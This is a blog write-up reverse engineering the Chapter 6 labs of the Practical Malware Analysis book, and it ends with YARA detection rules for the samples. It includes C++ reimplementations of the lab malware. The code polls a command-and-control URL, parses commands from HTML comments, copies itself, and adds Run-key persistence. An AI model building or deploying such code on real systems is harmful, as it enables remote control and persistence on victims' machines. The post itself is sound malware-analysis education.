---
title:  "PMA - Going even further: Lab06 (1, 2, 3, 4)"
date:   2023-11-28
draft: false
categories: ["PMA"]
tags: ["reverse-engineer", "malware-analysis"]
---

## Introduction

In this post, we'll dive into the all labs from chapter 6 of the PMA book. This chapter teaches us how to recognize C code constructs in Assembly, which is very important for a reverse engineer.

Those labs are an evolution of one another. This makes tools like Bindiff very useful for seeing what changes in each version.

Today, I will use the demo version of **binary ninja** disassembly just because I'm deciding whether to flow with Ghdira or buy a license for binja. And yeah, IDA is out of the contest.

## Lab06-01

This first lab is very simple because it just contains a condition and a function that checks the internet status.

The demo version of binja doesn't recognize the program's main function, but it's very easy to find it at the entry point. Basically, I look for the last call instruction with three pushes.

{{< figure
    src="imgs/img00.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

As I said, the main function contains an *if* condition that will compare the return value of the function `sub_401000` with zero.

{{< figure
    src="imgs/img01.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

So, let's understand the function `sub_401000` and see what it does.

{{< figure
    src="imgs/img02.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

By looking at the [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetgetconnectedstate), this function retrieves the states of the local system. And its return values are TRUE if there is an active internet connection and FALSE if doesn't.

So, I tried to reimplement this program the following way.

```cpp
  BOOL CheckInternetAccess(void) {
    BOOL state;

    if (InternetGetConnectedState(nullptr, 0) == 0) {
      printf_s("Error 1.1: No Internet\n");
      state = FALSE;
    }
    else {
      printf_s("Success: Internet Connection\n");
      state = TRUE;
    }

    return state;
  }


  int main(int argc, char* argv, char* envp) {
    int state;

    if (CheckInternetAccess() != 0)
      state = TRUE;
    else
      state = FALSE;

    return state;
  }
```

## Lab06-02

Well, as this is the demo version of the binja, I forget that it doesn't allow you to install plugins. So to get the diff result, I used the Ghidra to export the analysed binary to import on bindiff.

So, after inputting the analyzed binary and doing a diff, it's clear that one more condition was added to the code, as we can see in the below.

{{< figure
    src="imgs/img03.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

By looking at the APIs used in the function at `sub_401040`, it's easy to say that it may read some file content from the URL (<http://www[.practicalmalwareanalysisc.]com/cc.htm>). After reading the content, the malware tries to parse a HTML comment from the `.htm` file that starts with `<!--`.

If the return value is `TRUE`, the malware prints a message with the parsed command and sleeps for 60000 milliseconds.

The reimplementation of this code looks like this:

```cpp
  char GetCommandFromInternet(void) {
    HINTERNET hInet = nullptr;
    HINTERNET hGetUrl = nullptr;

    BOOL status = FALSE;

    char* buffer = new char[512];
    DWORD size;

    hInet = InternetOpenA("Internet Explorer 7.5/pma", 0, nullptr, nullptr, 0);
    hGetUrl = InternetOpenUrlA(hInet, "http://IP:PORT/cc.htm", nullptr, 0, 0, 0);
    if (hGetUrl == NULL) {
      printf_s("Error 2.1: Fail to OpenUrl\n");
      InternetCloseHandle(hInet);
      status = FALSE;
    }
    else if (!InternetReadFile(hGetUrl, buffer, 512, &size)) {
      printf_s("Error 2.2: Fail to ReadFile\n");
      InternetCloseHandle(hInet);
      InternetCloseHandle(hGetUrl);
      status = FALSE;
    }
    else if (buffer[0] != '<') {
    _FailedCommand:
      printf_s("Error 2.3: Fail to get command\n");
      status = FALSE;
    }
    else {
      if (buffer[1] != '!')
        goto _FailedCommand;
      
      if (buffer[2] != '-')
        goto _FailedCommand;

      if (buffer[3] != '-')
        goto _FailedCommand;

      status = buffer[4];
    }

    delete[] buffer;

    return (char)status;
  }


  int main(int argc, char* argv, char* envp) {
    if (CheckInternetAccess() != 0) {
      char cmd = GetCommandFromInternet();
      if ((int)cmd != 0) {
        printf_s("Success: Parsed command is \"%c\"\n", cmd);
        Sleep(0xEA60);
      }
    }
    return ERROR_SUCCESS;
  }
```

## Lab06-03

In the third lab, we can see a new function `sub_401130` added in the main. Inside this function, we can see that it performs the action from the command received by the previous function. This function uses the switch case statement to validate between (a, b, c, d, and e) commands.

{{< figure
    src="imgs/img04.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

The behavior of each command are described below:

- a - creates a directory named `Temp` on the root dir of the system
- b - copy itself to the `C:\Temp` directory with the name `cc.exe`
- c - delete itself from the system
- d - set its persistence mechanism by creating a registry key with the name `Malware`
- e - sleeps for 100000 milliseconds

{{< figure
    src="imgs/img05.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

My reimplementation of this code looks like this:

```cpp
  int main(int argc, char* argv[], char* envp[])
  {
    if (CheckInternetAccess() != 0)
    {
      char cmd = GetCommandFromInternet();
      if ((int)cmd != 0)
      {
        printf_s("Success: Parsed command is \"%c\"\n", cmd);
        ExecCommand(cmd, (PSTR)argv[0]);
        Sleep(0xEA60);
      }
    }
    return ERROR_SUCCESS;
  }


  DWORD ExecCommand(char command, PSTR current_path)
  {
    DWORD result;

    if ((command - 0x61) > 4)
      printf_s("Error 3.2: Not a valid command provided");
    else
    {
      switch (command)
      {
        case 'a':
        {
          CreateDirectoryA("C:\\Temp", nullptr);
          break;
        }
        case 'b':
        {
          CopyFileA(current_path, "C:\\Temp\\cc.exe", TRUE);
          break;
        }
        case 'c':
        {
          DeleteFileA("C:\\Temp\\cc.exe");
          break;
        }
        case 'd':
        {
          HKEY hKey = nullptr;
          RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
          if (RegSetValueExA(hKey, "Malware", 0, REG_SZ, (const PBYTE)"C:\\Temp\\cc.exe", 0xF) != NO_ERROR)
            printf_s("Error 3.1: Could not set Registry value");
          break;
        }
        case 'e':
        {
          Sleep(0x186A0);
          break;
        }
      }
    }

    result = GetLastError();
    return result;
  }
```

## Lab06-04

In this last lab, the most significant difference was in the main function with a *for* loop that will interact for 1440 minutes (24 hours), and in each interaction, the malware will pass as argument to the mw_GetCommandFromInternet function that will be used to be placed in the user-agent `"Internet Explorer 7.50/pma%d"` with the `_sprintf` function.

{{< figure
    src="imgs/img06.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

{{< figure
    src="imgs/img07.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

```cpp
  int main(int argc, char* argv[], char* envp[])
  {
    if (CheckInternetAccess() != 0)
    {
      for (int i = 0; i < 1440; i++)
      {
        char cmd = GetCommandFromInternet(i);
        if ((int)cmd != 0)
        {
          printf_s("Success: Parsed command is \"%c\"\n", cmd);
          ExecCommand(cmd, (PSTR)argv[0]);
          Sleep(0xEA60);
        }
      }
    }
    return ERROR_SUCCESS;
  }

  char GetCommandFromInternet(int x)
  {
    HINTERNET hInet = nullptr;
    HINTERNET hGetUrl = nullptr;

    BOOL status = FALSE;

    char* buffer = new char[512];
    DWORD size;
    
    char user_agent[28];
    sprintf_s(user_agent, sizeof(user_agent), "Internet Explorer 7.50/pma%d", x);

    hInet = InternetOpenA(user_agent, 0, nullptr, nullptr, 0);
    hGetUrl = InternetOpenUrlA(hInet, "http://IP:PORT/cc.htm", nullptr, 0, 0, 0);
    if (hGetUrl == NULL)
    {
      printf_s("Error 2.1: Fail to OpenUrl\n");
      InternetCloseHandle(hInet);
      status = FALSE;
    }
    else if (!InternetReadFile(hGetUrl, buffer, 512, &size))
    {
      printf_s("Error 2.2: Fail to ReadFile\n");
      InternetCloseHandle(hInet);
      InternetCloseHandle(hGetUrl);
      status = FALSE;
    }
    else if (buffer[0] != '<')
    {
    _FailedCommand:
      printf_s("Error 2.3: Fail to get command\n");
      status = FALSE;
    }
    else
    {
      if (buffer[1] != '!')
        goto _FailedCommand;

      if (buffer[2] != '-')
        goto _FailedCommand;

      if (buffer[3] != '-')
        goto _FailedCommand;

      status = buffer[4];
    }

    delete[] buffer;

    return (char)status;
  }
```

## Yara rules

Here are some Yara rules:

```text
  rule Lab06_01 {
    meta:
        description = "PMA file Lab06-01.exe"
        author = "P4nd4m1cb0y"
        date = "2023-11-28"
        hash1 = "fe30f280b1d0a5e9cef3324c2e8677f55a6202599d489170ece125f3cd843a03"

    strings:
        $s1 = "Success: Internet Connection" fullword ascii
        $s2 = "Error 1.1: No Internet" fullword ascii

    condition:
        uint16(0) == 0x5a4d and filesize < 50KB and
        all of them
  }

  rule Lab06_02 {
    meta:
        description = "PMA file Lab06-02.exe"
        author = "P4nd4m1cb0y"
        date = "2023-11-28"
        hash1 = "b71777edbf21167c96d20ff803cbcb25d24b94b3652db2f286dcd6efd3d8416a"
    
    strings:
        $s1 = "Success: Internet Connection" fullword ascii
        $s2 = "Success: Parsed command is %c" fullword ascii
        $s3 = "Error 1.1: No Internet" fullword ascii
        $s4 = "Error 2.1: Fail to OpenUrl" fullword ascii
        $s5 = "Error 2.2: Fail to ReadFile" fullword ascii
        $s6 = "Error 2.3: Fail to get command" fullword ascii
        $s7 = "http://www.practicalmalwareanalysis.com/cc.htm" fullword ascii
        $s8 = "Internet Explorer 7.5/pma" fullword ascii
    
    condition:
        uint16(0) == 0x5a4d and filesize < 50KB and
        all of them
  }

  rule Lab06_02_Parse_Command {
     meta:
        description = "PMA file Lab06-02.exe"
        author = "P4nd4m1cb0y"
        date = "2023-11-28"
        hash1 = "b71777edbf21167c96d20ff803cbcb25d24b94b3652db2f286dcd6efd3d8416a"

    strings:
        $STR1 = { 0f be 8? ?? ?? ?? ?? 83 f9 3c 75 ?? 0f be 9? ?? ?? ?? ?? 83 fa 21 75 
        ?? 0f be 8? ?? ?? ?? ?? 83 f8 2d 75 ?? 0f be 8? ?? ?? ?? ?? 83 f9 2d 75 ?? 8a 8? ?? ?? ?? ?? eb ?? }
        
        /*
          MOVSX      ECX,byte ptr [EBP + local_214]
          CMP        ECX,0x3c <
          JNZ        LAB_0040111d
          MOVSX      EDX,byte ptr [EBP + local_213]
          CMP        EDX,0x21 !
          JNZ        LAB_0040111d
          MOVSX      EAX,byte ptr [EBP + local_212]
          CMP        EAX,0x2d -
          JNZ        LAB_0040111d
          MOVSX      ECX,byte ptr [EBP + local_211]
          CMP        ECX,0x2d -
          JNZ        LAB_0040111d
          MOV        AL,byte ptr [EBP + local_210]
          JMP        LAB_0040112c
        */

    condition:
        uint16(0) == 0x5a4d and filesize < 50KB and $STR1
  }

  rule Lab06_03 {
    meta:
        description = "PMA file Lab06-03.exe"
        author = "P4nd4m1cb0y"
        date = "2023-11-28"
        hash1 = "75eb05679a0a988dddf8badfc6d5996cc7e372c73e1023dde59efbaab6ece655"
    
    strings:
        $s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $s2 = "C:\\Temp\\cc.exe"
        $s3 = "C:\\Temp"
        $s4 = "Malware"
    
    condition:
        uint16(0) == 0x5a4d and filesize < 50KB and
        all of them
  }
```

## Conclusion

This lab was excellent for practicing reversing a sample and helped us to identify code construction in Assembly. I will probably continue to use more of binja and maybe buy a license. It seems a promissing tool.

The full source code can be found on my [Github](https://github.com/P4nD3m1CB0Y0xD/PMA-Book-Code/tree/main). See you in the next!
